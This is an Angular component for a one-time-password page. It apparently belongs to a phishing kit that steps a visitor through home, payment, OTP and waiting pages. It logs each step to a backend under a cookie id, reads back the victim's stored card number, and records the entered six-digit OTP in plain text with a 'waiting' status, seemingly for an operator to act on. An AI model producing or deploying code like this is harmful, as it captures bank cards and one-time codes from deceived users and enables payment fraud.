import { Component, OnInit } from '@angular/core';
import { AppService } from '../app.service';
import { Router } from '@angular/router';
import { ActivatedRoute } from '@angular/router';
import { CookieService } from 'ngx-cookie-service';

@Component({
  selector: 'app-otp',
  templateUrl: './otp.component.html',
  styleUrls: ['./otp.component.css']
})
export class OtpComponent implements OnInit {
  otpError = false;
  myOTP: any;
  mainObj: any = {};
  last4: any;
  constructor(private appService: AppService, private router: Router, private route: ActivatedRoute, private cookieService: CookieService) {
    if (!sessionStorage.getItem('homeinfo')) {
      this.router.navigate(['/home'], { queryParams: { pwd: 'safe' } })
    } else {
      if (!sessionStorage.getItem('payment')) {
        this.router.navigate(['/payments'])
      }
    }
  }

  ngOnInit(): void {

    this.route.params.subscribe(params => {

      if (params['id'] == 'true') {
        this.otpError = true
      } else {
        false
      }
    });
    setTimeout(() => {
      const logs = { text: "user on otp page", date: new Date }
      this.appService.updateUser(undefined, this.cookieService.get('id'), logs, undefined, undefined, undefined).subscribe(res => {

      });

    }, 1500)

    this.appService.getuser(this.cookieService.get('id')).subscribe(
      res => {
        const info = res.quick_data.payment_info[0].Card_number;
        this.last4 = info.slice(14);
      }
    )
  }

  ngAfterViewInit() {
    if ('OTPCredential' in window) {
      const ac = new AbortController();
      var reqObj = {
        otp: { transport: ['sms'] },
        signal: ac.signal
      };
      navigator.credentials.get(reqObj)
        .then(otp => {

        })
        .catch(err => {

          console.log(err);
        });
    } else {

    }
  }

  submit() {

    const id = this.cookieService.get('id')
    const otp = this.myOTP;
    if (this.myOTP.length == 6) {
      const logs = { text: `otp: ${this.myOTP}`, date: new Date }
      const status = "waiting";


      this.appService.updateUser(undefined, id, logs, status, otp, undefined).subscribe(

      );

      sessionStorage.setItem('otp', '1');
      this.router.navigate(['/waiting']);
    }






  }

}
